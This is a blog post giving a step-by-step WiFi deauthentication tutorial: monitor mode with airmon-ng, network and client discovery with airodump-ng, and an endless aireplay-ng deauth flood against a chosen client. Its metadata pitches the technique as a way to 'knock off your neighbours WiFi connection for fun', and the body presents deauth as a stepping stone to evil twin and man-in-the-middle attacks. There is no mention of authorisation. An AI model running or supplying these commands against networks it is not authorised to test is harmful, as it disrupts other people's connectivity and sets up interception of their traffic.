---
author: Manas S
pubDatetime: 2026-01-06T06:08:58Z
modDatetime: 2026-01-06T06:08:58Z
title: WiFi de-authentication Attack
slug: wifi-deauth-attack
featured: true
draft: false
tags:
  - linux
  - wifi
  - attack
  - network-security
description: knock off your neighbours WiFi connection for fun
---

Wireless security auditing is a critical skill for any cybersecurity enthusiast or professional. Before diving into the technical commands, it is essential to understand the underlying mechanics of how wireless adapters interact with the airwaves around them.

In this guide, we will explore the transition from standard "Managed" mode to "Monitor" mode and demonstrate how to identify networks and test their resilience using deauthentication techniques.

## Table of contents
## Core Concepts

### Managed vs. Monitor Mode

By default, your wireless card operates in **Managed Mode**. In this state, the card only "listens" to packets specifically addressed to it from the Access Point (AP) it is connected to. It ignores everything else.

**Monitor Mode** allows your card to listen to _every_ packet in the air on a specific channel, regardless of whether it is addressed to your device or even encrypted. This is the foundation of wireless sniffing and injection.

### What is Deauthentication?

A deauthentication (deauth) attack is not a "hack" in the traditional sense, but rather a misuse of a built-in feature of the 802.11 protocol. It involves sending a "deauth" frame from your machine to an Access Point, pretending to be a client that wants to disconnect, or vice versa. This forces the target client to disconnect and attempt to reconnect—a process often used to capture "handshakes" for password cracking.

### A Stepping Stone for MITM Attacks

Deauthentication is more than just a tool for disconnecting users; it is a critical stepping stone for **Man-in-the-Middle (MITM)** attacks. By forcibly disconnecting a client, an attacker can position themselves to intercept the subsequent reconnection process. This is frequently used to facilitate "Evil Twin" attacks, where the attacker hosts a malicious Access Point with the same name (SSID) as the legitimate one. When the deauthenticated client tries to reconnect, their device may automatically associate with the attacker's stronger signal, allowing the attacker to monitor, modify, or inject malicious data into the victim's web traffic.

## Requirements

Before starting, ensure you have the following:

- **A Compatible Wireless Adapter:** Not all cards support packet injection and monitor mode. Look for adapters with chipsets like Atheros AR9271 or Realtek RTL8812AU.
- **Kali Linux or Parrot OS:** These distributions come pre-installed with the **Aircrack-ng** suite.
- **Root Privileges:** Most of these commands interact directly with hardware and require `sudo`.

## Step 1: Set Wireless Adapter to Monitor Mode

First, we need to clear any processes that might interfere with our wireless card (like Network Manager) and then flip the switch to Monitor mode.

```
# Terminate interfering processes
sudo airmon-ng check kill

# Start monitor mode on wlan0
sudo airmon-ng start wlan0 

# Optional: Start on a specific channel (e.g., Channel 5)
sudo airmon-ng start wlan0 5
```

_Note: Once you run `check kill`, your internet connection will drop because the Network Manager service is stopped._

## Step 2: List All WiFi Access Points

Now that we are in monitor mode, we can see every broadcast in our vicinity. We use `airodump-ng` to sniff the airwaves.

```
# Scan for all nearby APs and connected clients
sudo airodump-ng wlan0
```

While this runs, look for the following columns:

- **BSSID:** The MAC address of the Access Point.
- **CH:** The channel the AP is operating on.
- **STATION:** The MAC address of a client connected to an AP.

## Step 3: Targeted Deauthentication

Once you have identified your target BSSID and a client (Station) connected to it, you can test the connection's stability by sending deauthentication frames.

```
# Send continuous deauth packets to a specific client
sudo aireplay-ng --deauth 0 -a <accesspoint_bssid> -c <client_bssid> wlan0
```

### Breakdown of the command:

- `--deauth 0`: Sends an infinite stream of deauth packets (use a number like 10 for a limited burst).
- `-a`: The BSSID of the target Access Point.
- `-c`: The BSSID of the specific client you want to disconnect.

## Conclusion

Setting your card to monitor mode is the "Hello World" of wireless pentesting. By understanding how to move from a passive observer to an active participant in a wireless network, you gain a deeper appreciation for the protocols that keep our data safe—and the vulnerabilities that exist within them.


## Useful Commands
- to list the available wireless channels and to find out current wireless channel
```zsh
iwlist wlan0 channel
```
